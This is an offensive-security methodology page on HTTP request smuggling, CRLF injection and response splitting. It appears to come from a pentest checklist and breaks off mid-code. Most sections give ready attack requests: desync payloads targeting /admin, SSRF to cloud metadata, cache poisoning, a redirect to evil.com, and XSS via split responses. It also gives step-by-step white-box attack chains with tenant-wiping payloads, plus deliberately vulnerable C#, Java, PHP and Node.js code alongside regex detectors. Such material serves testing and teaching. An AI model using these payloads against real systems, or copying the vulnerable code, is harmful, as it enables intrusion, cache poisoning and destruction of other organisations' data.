# HTTP Splitting Smuggling

## Check List

## Methodology

### Black Box

#### [HRS With Content-Length And Transfer-Encoding](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Request%20Smuggling#clte-vulnerabilities)

{% stepper %}
{% step %}
Inject conflicting Content-Length and Transfer-Encoding headers to test for desync

```http
POST /path HTTP/1.1
Host: target.com
Content-Length: 50
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
```
{% endstep %}

{% step %}
Check if the response indicates the backend processed the smuggled `GET /admin` request
{% endstep %}
{% endstepper %}

***

#### [HTTP/2 To HTTP/1.1 Downgrade](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Request%20Smuggling#http2-request-smuggling)

{% stepper %}
{% step %}
If the site supports HTTP/2, force a downgrade to HTTP/1.1 with a smuggling payload

```http
POST /path HTTP/2
Host: target.com
Transfer-Encoding: chunked
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
```
{% endstep %}

{% step %}
Verify if the backend executes the smuggled GET /admin request
{% endstep %}
{% endstepper %}

***

#### [Multi-Chunked Smuggling](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Request%20Smuggling#tete-vulnerabilities)

{% stepper %}
{% step %}
Inject multiple Transfer-Encoding headers to confuse proxy parsing

```http
POST /path HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
```
{% endstep %}

{% step %}
Check if the smuggled request is processed by the backend
{% endstep %}
{% endstepper %}

***

#### Invalid TE Header Manipulation

{% stepper %}
{% step %}
Use malformed Transfer-Encoding headers to bypass validation

```http
POST /path HTTP/1.1
Host: vulnerable.com
Transfer-Encoding: cHuNkEd
Content-Length: 60

0
GET /admin HTTP/1.1
```
{% endstep %}

{% step %}
Verify if the response includes evidence of the smuggled request
{% endstep %}
{% endstepper %}

***

#### Cache Poisoning With HRS

{% stepper %}
{% step %}
Inject a payload to poison the CDN cache

```http
POST /path HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 60

0
GET /index.html HTTP/1.1
X-Cache-Inject: evil.js
```
{% endstep %}

{% step %}
Check if the cache serves evil.js to subsequent users
{% endstep %}
{% endstepper %}

***

#### SSRF With HRS

{% stepper %}
{% step %}
Smuggle a payload to access internal services

```http
POST /path HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 60

0
GET http://169.254.169.254/latest/meta-data/ HTTP/1.1
```
{% endstep %}

{% step %}
Verify if the response contains internal metadata (AWS metadata)
{% endstep %}
{% endstepper %}

***

#### WAF Bypass With HRS

{% stepper %}
{% step %}
Split payloads to evade WAF detection

```http
POST /path HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
X-Bypass: evasion

0
GET /secret HTTP/1.1
```
{% endstep %}

{% step %}
Check if the smuggled request bypasses the WAF and reaches the backend
{% endstep %}
{% endstepper %}

***

#### Blind HRS

{% stepper %}
{% step %}
Inject a time-delayed payload to detect blind smuggling

```http
POST /path HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 40

0
GET /admin HTTP/1.1
```
{% endstep %}

{% step %}
Measure response delays to infer smuggling success
{% endstep %}
{% endstepper %}

***

#### Multi-Hop Proxy Smuggling

{% stepper %}
{% step %}
Inject payloads across a chain of proxies (CDN → Load Balancer → Backend)

```http
POST /path HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 60

0
GET /admin HTTP/1.1
```
{% endstep %}

{% step %}
Trace the smuggled request across each hop and check for discrepancies in processing
{% endstep %}
{% endstepper %}

***

#### [Basic CRLF Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection#carriage-return-line-feed)

{% stepper %}
{% step %}
Modify the query parameter by injecting a CRLF sequence to add a custom header

```http
GET /page?input=home%0d%0aSet-Cookie:crlf=injected
```
{% endstep %}

{% step %}
Check the response headers for the injected Set-Cookie: crlf=injected. If present, the endpoint is vulnerable

{% hint style="info" %}
The important thing is that if you inject the payload and get a 400 in response, it can indicate that the server is vulnerable, but if it gives a 404 in response, it means that the server is not vulnerable
{% endhint %}
{% endstep %}
{% endstepper %}

***

#### [Cookie Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection#session-fixation)

{% stepper %}
{% step %}
Inject a CRLF sequence to manipulate cookies

```http
GET /page?input=home%0d%0aSet-Cookie:hacked=true
```
{% endstep %}

{% step %}
Verify if the response includes the injected cookie `(hacked=true)` or affects session behavior
{% endstep %}
{% endstepper %}

***

#### [Redirection/phishing](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection#open-redirect)

{% stepper %}
{% step %}
CRLF Injection can be used to inject links that redirect users to phishing sites

```http
%0d%0a%0d%0a%3CA%20HREF%3D%22https%3A%2F%2Fexample.com%2F%22%3ELogin%20Here%20%3C%2FA%3E%0A%0A
```
{% endstep %}

{% step %}
Observe if the browser redirects to phishing page
{% endstep %}
{% endstepper %}

***

#### [Open Redirect](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection#open-redirect)

{% stepper %}
{% step %}
Inject a Location header to redirect to a malicious site

```http
GET /page?input=home%0d%0aLocation:https://evil.com
```
{% endstep %}

{% step %}
Observe if the browser redirects to https://evil.com
{% endstep %}
{% endstepper %}

***

#### HTTP Response Splitting

{% stepper %}
{% step %}
By injecting %0d%0a (Carriage Return + Line Feed), an attacker can split the server’s HTTP response into two parts. This enables manipulation of headers and body content in unexpected ways

```http
/vulnerable-endpoint?q=abc%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert('Unk9vvN!')</script>
```
{% endstep %}

{% step %}
`%0d%0a` → Ends the current header line and A new `HTTP/1.1 200` OK response starts with a malicious script in the body
{% endstep %}
{% endstepper %}

***

#### [Test XSS Protection Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection#cross-site-scripting)

{% stepper %}
{% step %}
Inject a payload to disable XSS protections and execute JavaScript

```http
GET /page?input=home%0d%0aX-XSS-Protection:0%0d%0a%0d%0a%3Cscript%3Ealert(document.cookie)%3C/script%3E
```
{% endstep %}

{% step %}
Verify if the response includes X-XSS-Protection: 0 and the script executes
{% endstep %}
{% endstepper %}

***

#### [Test GBK-Encoded CRLF Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection#filter-bypass)

{% stepper %}
{% step %}
If standard CRLF payloads are blocked, use GBK-encoded characters

```
GET /page?input=home%E5%98%8D%E5%98%8ASet-Cookie:crlfinjection=unk9vvn
```
{% endstep %}

{% step %}
Check if the response includes the injected Set-Cookie: crlfinjection=unk9vvn
{% endstep %}
{% endstepper %}

***

#### [CRLF Injection Using cURL](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection)

{% stepper %}
{% step %}
Test for CRLF Injection using cURL

```
curl -I "https://target.com/page?input=home%0d%0aSet-Cookie:crlf=injected"
```
{% endstep %}

{% step %}
Check the response headers for set-cookie: crlf=injected

```http
HTTP/2 301
date: Mon, 12 May 2025 12:46:42 GMT
content-type: text/html
location: https://example.com/
set-cookie: crlf=injected; -> vulnerability
```
{% endstep %}
{% endstepper %}

***

#### CRLF Header Injection Via "redirect\_uri" Parameter

{% stepper %}
{% step %}
Log in to the target site and review the authentication process
{% endstep %}

{% step %}
Then check whether the authentication process is performed using Oauth or not
{% endstep %}

{% step %}
If Oauth is used then get the `redirect_uri` parameter in the Burp Suite request and send it to the repeater
{% endstep %}

{% step %}
Then test the CRLF Injection tests in this parameter, like below

```
https://subdomain.example.com/oauth/authorize?client_id=&redirect_uri=%0d%0axxx:something&response_type=code
```
{% endstep %}

{% step %}
Then send the request and inspect the HTTP responses. If you see the following injected value, the vulnerability is confirmed

```http
location: xxx:something?error=invalid_scope
```
{% endstep %}
{% endstepper %}

***

### White Box

#### Cross-Tenant Request Smuggling via Raw TCP Socket Pipelining in Legacy Gateways

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on modernization layers where a modern frontend communicates with a newly deployed API Gateway
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify the "Anti-Corruption Layer" architecture. To bridge the gap between modern OAuth2/JWT authentication and an internal, legacy monolithic Mainframe (which expects plain text headers and basic HTTP/1.1), the API Gateway acts as a translation proxy
{% endstep %}

{% step %}
Investigate the downstream connection bottleneck. Instantiating a full, high-level HTTP Client (e.g., `HttpClient`, `Guzzle`, `axios`) for every proxy request introduces massive garbage collection overhead and TCP handshake latency, crushing the Gateway's throughput
{% endstep %}

{% step %}
Discover the "Raw Socket Keep-Alive" optimization. To handle tens of thousands of requests per second, the API Gateway opens a persistent, shared TCP connection pool directly to the Mainframe. The Gateway manually constructs the raw HTTP/1.1 request strings and pipelines them onto the active socket
{% endstep %}

{% step %}
Analyze the identity translation logic. The Gateway extracts claims from the cryptographically verified JWT (e.g., `tenant_id`, `department`, `display_name`) and interpolates them directly into the legacy HTTP headers (e.g., `X-Legacy-Tenant: {tenant_id}`)
{% endstep %}

{% step %}
Understand the architectural assumption: The Gateway developer explicitly assumes that because the JWT is cryptographically signed and verified, the data contained within its claims is inherently safe. They fail to apply HTTP header sanitization (stripping `\r\n`) before injecting the claims into the raw socket stream
{% endstep %}

{% step %}
Formulate the HTTP Splitting payload. You must inject a sequence that gracefully closes the active HTTP header block, terminates the request, and initiates a completely new, smuggled HTTP request bound for a highly privileged administrative endpoint on the legacy Mainframe
{% endstep %}

{% step %}
Payload structure: `Dummy\r\n\r\nPOST /legacy/admin/destroy_tenant HTTP/1.1\r\nHost: mainframe.internal\r\nContent-Length: 0\r\n\r\nX-Ignored-Header`
{% endstep %}

{% step %}
Authenticate to the platform as a standard user. Update your user profile to embed the payload into a standard string claim (e.g., your `Department` or `DisplayName`)
{% endstep %}

{% step %}
The identity provider issues a new, mathematically valid JWT containing your poisoned claim
{% endstep %}

{% step %}
Send a legitimate request to the API Gateway using your new JWT
{% endstep %}

{% step %}
The Gateway validates the signature, extracts the poisoned claim, string-interpolates it into the raw HTTP/1.1 request, and pushes it onto the persistent connection pool
{% endstep %}

{% step %}
The legacy Mainframe parses the TCP stream. It encounters the `\r\n\r\n`, terminates the first request, and immediately consumes your smuggled administrative request. Because this occurs over a trusted, shared internal connection pool, the Mainframe executes the destructive action, completely bypassing the Gateway's access controls

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:StreamWriter.*Write(?:Line|Async)\s*\(\s*\$"[A-Z]+\s+\/.*HTTP\/1\.1)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:socket\.getOutputStream\(\)\.write\s*\(\s*\(".*HTTP\/1\.1)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:fwrite\s*\(\s*\$[A-Za-z_][A-Za-z0-9_]*Socket\s*,\s*"[A-Z]+\s+\/.*HTTP\/1\.1)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:stream\.write\s*\(\s*`[A-Z]+\s+\/.*HTTP\/1\.1)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
StreamWriter.*WriteLineAsync\(.*"[A-Z]+\s+\/.*HTTP\/1\.1
```
{% endtab %}

{% tab title="Java" %}
```regexp
socket\.getOutputStream\(\)\.write\(.*HTTP\/1\.1
```
{% endtab %}

{% tab title="PHP" %}
```regexp
fwrite\(\$legacySocket,.*HTTP\/1\.1
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
stream\.write\(`.*HTTP\/1\.1
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class LegacyProxyService 
{
    private readonly NetworkStream _persistentStream;

    public async Task ProxyToMainframeAsync(HttpContext context, string legacyPath) 
    {
        // [1]
        // [2]
        var tenantId = context.User.FindFirst("tenant_id")?.Value;
        var department = context.User.FindFirst("department")?.Value;

        // [3]
        // [4]
        var rawRequest = new StringBuilder();
        rawRequest.Append($"GET {legacyPath} HTTP/1.1\r\n");
        rawRequest.Append($"Host: mainframe.internal.corp\r\n");
        rawRequest.Append($"X-Tenant-Id: {tenantId}\r\n");
        rawRequest.Append($"X-Department: {department}\r\n");
        rawRequest.Append("\r\n");

        var buffer = Encoding.ASCII.GetBytes(rawRequest.ToString());
        await _persistentStream.WriteAsync(buffer, 0, buffer.Length);
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Service
public class LegacyProxyService {

    private Socket persistentSocket;

    public void proxyToMainframe(HttpServletRequest context, String legacyPath) throws IOException {
        // [1]
        // [2]
        String tenantId = (String) context.getAttribute("jwt_tenant_id");
        String department = (String) context.getAttribute("jwt_department");

        // [3]
        // [4]
        String rawRequest = 
            "GET " + legacyPath + " HTTP/1.1\r\n" +
            "Host: mainframe.internal.corp\r\n" +
            "X-Tenant-Id: " + tenantId + "\r\n" +
            "X-Department: " + department + "\r\n\r\n";

        persistentSocket.getOutputStream().write(rawRequest.getBytes(StandardCharsets.US_ASCII));
        persistentSocket.getOutputStream().flush();
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class LegacyProxyService 
{
    protected $persistentStream;

    public function proxyToMainframe(Request $context, string $legacyPath): void 
    {
        // [1]
        // [2]
        $tenantId = $context->attributes->get('jwt_tenant_id');
        $department = $context->attributes->get('jwt_department');

        // [3]
        // [4]
        $rawRequest = "GET {$legacyPath} HTTP/1.1\r\n" .
                      "Host: mainframe.internal.corp\r\n" .
                      "X-Tenant-Id: {$tenantId}\r\n" .
                      "X-Department: {$department}\r\n\r\n";

        fwrite($this->persistentStream, $rawRequest);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class LegacyProxyService {
    static async proxyToMainframe(req, legacyPath) {
        // [1]
        // [2]
        let tenantId = req.user.tenant_id;
        let department = req.user.department;

        // [3]
        // [4]
        let rawRequest = 
            `GET ${legacyPath} HTTP/1.1\r\n` +
            `Host: mainframe.internal.corp\r\n` +
            `X-Tenant-Id: ${tenantId}\r\n` +
            `X-Department: ${department}\r\n\r\n`;

        persistentSocket.write(rawRequest, 'ascii');
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The API Gateway terminates the external TLS connection and extracts the authorized user claims from the JSON Web Token, \[2] The backend framework securely mapped the external JSON payload, but the claims are stored as raw strings in memory, \[3] To avoid the serialization latency and connection buildup of full HTTP clients, the proxy builds raw HTTP/1.1 frames directly in memory to be flushed over a pre-established, shared TCP socket, \[4] The fatal boundary bypass. The developer explicitly trusts the contents of the JWT. By omitting CRLF filtering during string concatenation, the proxy acts as an inadvertent smuggling pipeline. Because the socket is shared across all tenants, injecting a second request permanently desynchronizes the mainframe's HTTP parser, causing it to execute unauthorized administrative actions under the implicit trust of the Gateway's internal connection

```http
// 1. Attacker controls their own Identity Profile (e.g., via the corporate HR portal).
// 2. Attacker modifies their 'Department' string to contain the HTTP Smuggling payload.
// Payload: Sales\r\n\r\nPOST /internal/admin/wipe-tenant HTTP/1.1\r\nHost: mainframe.internal.corp\r\nContent-Length: 22\r\n\r\n{"target":"VictimOrg"}

// 3. Attacker triggers a standard proxy request to the Gateway.
GET /api/v1/legacy/dashboard HTTP/1.1
Host: gateway.enterprise.tld
Authorization: Bearer <poisoned_jwt_token>

// 4. The Gateway string-builds the payload onto the shared TCP socket:
GET /api/v1/legacy/dashboard HTTP/1.1
Host: mainframe.internal.corp
X-Tenant-Id: OrgA
X-Department: Sales

POST /internal/admin/wipe-tenant HTTP/1.1
Host: mainframe.internal.corp
Content-Length: 22
// 
{"target":"VictimOrg"}
// 
// 5. The legacy Mainframe processes two discrete HTTP requests from the trusted internal socket, wiping the victim tenant.
```
{% endstep %}

{% step %}
To fulfill massive throughput requirements for legacy mainframe integrations, engineers opted to maintain a persistent TCP connection pool and bypass standard HTTP client libraries. They relied entirely on the cryptographic signature of incoming JWTs to establish a domain of trust, erroneously conflating authenticity with structural safety. The attacker manipulated an upstream identity source to inject HTTP control characters (`\r\n\r\n`) into a validated claim. When the API Gateway interpolated this claim into the raw socket buffer, it physically split the HTTP frame. The legacy backend—unaware of the external context and implicitly trusting the internal network socket—sequentially consumed the split payloads, resulting in perfect, unauthenticated Request Smuggling deep within the internal infrastructure
{% endstep %}
{% endstepper %}

***

#### Global Web Cache Poisoning via gRPC Metadata Transcoding Translation

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on high-performance Edge networks that front complex microservice meshes, especially those returning dynamic, user-controlled content
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify a gRPC Transcoding architecture. Internal microservices communicate via high-speed gRPC (HTTP/2 binary framing), but the Edge Gateway must transcode these responses back to legacy HTTP/1.1 REST for external client compatibility (e.g., utilizing Envoy, grpc-gateway, or custom transcoding middleware)
{% endstep %}

{% step %}
Investigate the Metadata Translation pipeline. In gRPC, microservices can return contextual data (e.g., Rate-Limit statuses, correlation IDs, or custom error contexts) using gRPC Trailers or Headers (Metadata)
{% endstep %}

{% step %}
Discover the performance optimization in the Gateway's Transcoder. To convert the binary gRPC metadata back into HTTP/1.1 plaintext headers, the transcoder iterates over the gRPC metadata map and string-concatenates them into the HTTP/1.1 response buffer (e.g., `Response.Headers.Append($"{key}: {value}\r\n")`)
{% endstep %}

{% step %}
Understand the fatal protocol dissonance: gRPC operates exclusively over HTTP/2. In HTTP/2, headers are transferred via HPACK binary frames. The `\r\n` characters carry no structural significance in HTTP/2; they are simply interpreted as literal characters inside the metadata value
{% endstep %}

{% step %}
Realize the trust assumption: The gRPC backend developers do not sanitize their metadata output for CRLF injection because, within their HTTP/2 execution environment, CRLF injection is mathematically impossible
{% endstep %}

{% step %}
Locate an endpoint where the gRPC backend echoes user-controlled input into a metadata header (`x-user-context`, `x-report-name`, or a diagnostic `x-failed-query` header)
{% endstep %}

{% step %}
Formulate the HTTP Response Splitting payload. You must inject `\r\n\r\n` to terminate the `HTTP/1.1` header block prematurely, followed by a completely forged, attacker-controlled HTTP response body
{% endstep %}

{% step %}
Payload structure: `DummyContext\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: 25\r\n\r\n<script>alert(1)</script>`
{% endstep %}

{% step %}
Submit the payload via the external REST API
{% endstep %}

{% step %}
The Transcoder translates the request to gRPC and forwards it. The gRPC backend safely sets the metadata containing your payload using HPACK framing
{% endstep %}

{% step %}
The Transcoder receives the gRPC response. It extracts the metadata value and directly interpolates it into the raw HTTP/1.1 response string destined for the external network
{% endstep %}

{% step %}
The `HTTP/1.1` response physically splits. The Content Delivery Network (CDN) or intermediate caching proxy sitting in front of the Gateway consumes the response. Due to connection pooling (Keep-Alive), the CDN caches the second, perfectly formed malicious response against the subsequent legitimate request, achieving zero-click, mass Web Cache Poisoning

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:stream\.WriteAsync.*Encoding\.UTF8\.GetBytes\(\$"\{[^}]+\}:\s*\{[^}]+\}\\r\\n")
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:writer\.print\([^)]*getKey\(\)\s*\+\s*":\s*"\s*\+\s*[^)]*getValue\(\)[^)]*\\r\\n)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:fwrite\s*\(\s*\$[A-Za-z_][A-Za-z0-9_]*Stream\s*,\s*"\{?\$[A-Za-z_]+\}:\s*\{?\$[A-Za-z_]+\}?\\r\\n")
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:socket\.write\s*\(`\$\{[^}]+\}:\s*\$\{[^}]+\}\\r\\n`\))
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
stream\.WriteAsync.*Encoding\.UTF8\.GetBytes\(.*metadata\.Key.*metadata\.Value.*\\r\\n
```
{% endtab %}

{% tab title="Java" %}
```regexp
writer\.print\(.*getKey\(\).*getValue\(\).*\\r\\n
```
{% endtab %}

{% tab title="PHP" %}
```regexp
fwrite\(\$httpStream,.*\$key.*\$value.*\\r\\n
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
socket\.write\(`.*\$\{key\}:.*\$\{value\}.*\\r\\n`\)
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class GrpcToHttpTranscoder 
{
    private readonly NetworkStream _clientHttpStream;

    public async Task TranscodeResponseAsync(GrpcResponse grpcResponse) 
    {
        var rawResponse = new StringBuilder();
        rawResponse.Append("HTTP/1.1 200 OK\r\n");

        // [1]
        // [2]
        foreach (var metadata in grpcResponse.Trailers) 
        {
            // [3]
            // [4]
            rawResponse.Append($"{metadata.Key}: {metadata.Value}\r\n");
        }

        rawResponse.Append($"Content-Length: {grpcResponse.Body.Length}\r\n\r\n");
        rawResponse.Append(grpcResponse.Body);

        var buffer = Encoding.UTF8.GetBytes(rawResponse.ToString());
        await _clientHttpStream.WriteAsync(buffer, 0, buffer.Length);
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Service
public class GrpcToHttpTranscoder {

    private OutputStream clientHttpStream;

    public void transcodeResponse(GrpcResponse grpcResponse) throws IOException {
        StringBuilder rawResponse = new StringBuilder();
        rawResponse.append("HTTP/1.1 200 OK\r\n");

        // [1]
        // [2]
        for (Map.Entry<String, String> metadata : grpcResponse.getTrailers().entrySet()) {
            // [3]
            // [4]
            rawResponse.append(metadata.getKey()).append(": ").append(metadata.getValue()).append("\r\n");
        }

        rawResponse.append("Content-Length: ").append(grpcResponse.getBody().length).append("\r\n\r\n");
        rawResponse.append(grpcResponse.getBody());

        clientHttpStream.write(rawResponse.toString().getBytes(StandardCharsets.UTF_8));
        clientHttpStream.flush();
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class GrpcToHttpTranscoder 
{
    protected $clientHttpStream;

    public function transcodeResponse(GrpcResponse $grpcResponse): void 
    {
        $rawResponse = "HTTP/1.1 200 OK\r\n";

        // [1]
        // [2]
        foreach ($grpcResponse->trailers as $key => $value) {
            // [3]
            // [4]
            $rawResponse .= "{$key}: {$value}\r\n";
        }

        $rawResponse .= "Content-Length: " . strlen($grpcResponse->body) . "\r\n\r\n";
        $rawResponse .= $grpcResponse->body;

        fwrite($this->clientHttpStream, $rawResponse);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class GrpcToHttpTranscoder {
    static async transcodeResponse(clientHttpSocket, grpcResponse) {
        let rawResponse = `HTTP/1.1 200 OK\r\n`;

        // [1]
        // [2]
        for (let [key, value] of Object.entries(grpcResponse.trailers)) {
            // [3]
            // [4]
            rawResponse += `${key}: ${value}\r\n`;
        }

        rawResponse += `Content-Length: ${Buffer.byteLength(grpcResponse.body)}\r\n\r\n`;
        rawResponse += grpcResponse.body;

        clientHttpSocket.write(rawResponse, 'utf8');
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The Transcoder microservice acts as the edge boundary, translating binary HTTP/2 gRPC traffic back into textual HTTP/1.1 traffic for external compatibility, \[2] The backend microservice heavily utilizes gRPC Trailers (Metadata) to pass dynamic contextual execution details back to the edge, \[3] The architecture relies entirely on the security of the HTTP/2 protocol. In gRPC, the backend developers do not sanitize CRLF characters because HPACK binary framing renders them completely inert, \[4] The fatal translation mismatch. To maximize throughput and avoid the latency of strict HTTP header generation libraries, the Transcoder dynamically string-builds the HTTP/1.1 headers. When the Transcoder pulls the inert string from the gRPC metadata and interpolates it into the raw HTTP/1.1 stream, the `\r\n` bytes regain their structural execution capabilities, perfectly splitting the HTTP response envelope

```http
// 1. Attacker sends an HTTP request designed to echo into a gRPC metadata header (e.g., custom report configuration).
// 2. Attacker injects the HTTP Response Splitting payload into the Custom-Report-Name field.
GET /api/v1/reports/status?reportName=DummyReport%0D%0A%0D%0AHTTP%2F1.1%20200%20OK%0D%0AContent-Type%3A%20text%2Fhtml%0D%0AContent-Length%3A%2030%0D%0A%0D%0A%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
Host: edge.enterprise.tld
```

<pre class="language-http"><code class="lang-http">// 3. The Edge Transcoder forwards the request via gRPC. 
// 4. The internal gRPC microservice processes it and securely sets the Trailer:
<strong>x-report-context: "DummyReport\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: 30\r\n\r\n&#x3C;script>alert(1)&#x3C;/script>"
</strong>
// 5. The Edge Transcoder translates the response into HTTP/1.1:
HTTP/1.1 200 OK
x-report-context: DummyReport
//
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 30
//
&#x3C;script>alert(1)&#x3C;/script>
Content-Length: 12

{"status": 1}

// 6. The CDN (Akamai, Cloudflare) consumes the raw TCP stream. Because of HTTP Keep-Alive, 
// the CDN believes it just received TWO discrete HTTP responses. It caches the second (malicious) response 
// and maps it to the very next unrelated user who requests a static asset.
</code></pre>
{% endstep %}

{% step %}
To bridge modern gRPC service meshes with legacy HTTP/1.1 external clients, architects implemented an Edge Transcoder. The security posture failed to recognize a fundamental protocol dissonance: strings that are completely safe within HTTP/2 HPACK binary framing become highly destructive control characters when downgraded to HTTP/1.1 plaintext. By trusting that the backend microservices had secured their own output, the Transcoder blindly copied gRPC metadata payloads into raw HTTP/1.1 string buffers. The attacker weaponized this trust by defining custom metadata containing explicit CRLF terminators and a completely forged HTTP response envelope. The Transcoder physically split the response over the TCP socket. The upstream Content Delivery Network interpreted the data stream as pipelined responses, silently caching the attacker's forged JavaScript payload against arbitrary organizational cache keys, achieving global Cache Poisoning
{% endstep %}
{% endstepper %}

***

#### Internal Pipeline Desynchronization via Encoding Asymmetry in Asynchronous Telemetry Batching

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on asynchronous, high-volume telemetry ingestion, audit logging features, or distributed event buses
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify the "Sidecar Batching" architecture. To avoid overwhelming the central Audit Microservice with millions of individual HTTP connections, applications push audit logs to a localized Sidecar proxy on the same node. The Sidecar batches 100 JSON events together and transmits them in a single, sustained `HTTP/1.1` pipeline
{% endstep %}

{% step %}
Investigate the HTTP Pipelining optimization. Instead of sending a single massive array (which requires reading the entire batch into memory), the Sidecar maintains an open Keep-Alive TCP socket and blasts dozens of individual `POST /audit` requests sequentially over the stream
{% endstep %}

{% step %}
Analyze how the Sidecar constructs the raw HTTP/1.1 requests. To avoid the memory overhead of instantiating full HTTP clients, the developer utilizes low-level string concatenation: `$"POST /audit HTTP/1.1\r\nContent-Length: {payloadLength}\r\n\r\n{payloadData}"`
{% endstep %}

{% step %}
Discover the fatal Encoding Asymmetry: To calculate the `Content-Length` header, the developer uses the native string length function (e.g., `String.Length` in C# or `.length` in Node.js/Java)
{% endstep %}

{% step %}
Understand the structural vulnerability of native string calculations. Native length functions count _characters_ (or UTF-16 code units), not the actual _byte_ length required by the HTTP/1.1 specification
{% endstep %}

{% step %}
Recognize the exploit mechanism: If an attacker injects multi-byte Unicode characters (e.g., Emojis), the `String.Length` (character count) will be significantly _smaller_ than the physical UTF-8 byte array transmitted over the TCP socket
{% endstep %}

{% step %}
Formulate the Smuggling Payload. Create a JSON payload where the content includes multi-byte characters specifically calculated to offset the length, followed by a fully-formed, smuggled HTTP request hidden at the absolute end of the JSON string
{% endstep %}

{% step %}
If the Sidecar calculates `Content-Length: 50` (based on characters), but the payload physically occupies `100` bytes on the wire, the central Audit Microservice will strictly consume the first 50 bytes as the body
{% endstep %}

{% step %}
The remaining 50 bytes (which contain your smuggled `POST /internal-admin HTTP/1.1` request) are left stranded in the TCP buffer
{% endstep %}

{% step %}
Because this is a shared, Keep-Alive pipeline, the central Microservice HTTP parser assumes the stranded bytes represent the _next_ pipelined request
{% endstep %}

{% step %}
Submit the payload via the standard application interface
{% endstep %}

{% step %}
The Sidecar processes the payload, calculates the mismatched length, and flushes it to the pipeline. The central aggregator cuts the parsing short, desynchronizes the socket, and flawlessly executes your smuggled administrative request hidden in the residual TCP buffer

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\bContent-Length:\s*\{\w+\.Length\}
```
{% endtab %}

{% tab title="Java" %}
```regexp
\bContent-Length:\s*"\s*\+\s*\w+\.length\(\)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\bContent-Length:\s*"\s*\.\s*mb_strlen\(
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\bContent-Length:\s*\$\{\w+\.length\}
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
Content-Length:\s*\{\w+\.Length\}
```
{% endtab %}

{% tab title="Java" %}
```regexp
Content-Length:\s*"\s*\+\s*\w+\.length\(\)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
Content-Length:\s*"\s*\.\s*mb_strlen\(
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
Content-Length:\s*\$\{\w+\.length\}
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class TelemetryBatchSidecar 
{
    private readonly NetworkStream _auditStream;

    public async Task FlushBatchAsync(List<AuditLog> logs) 
    {
        foreach (var log in logs) 
        {
            var jsonPayload = JsonConvert.SerializeObject(log);
            
            // [1]
            // [2]
            // [3]
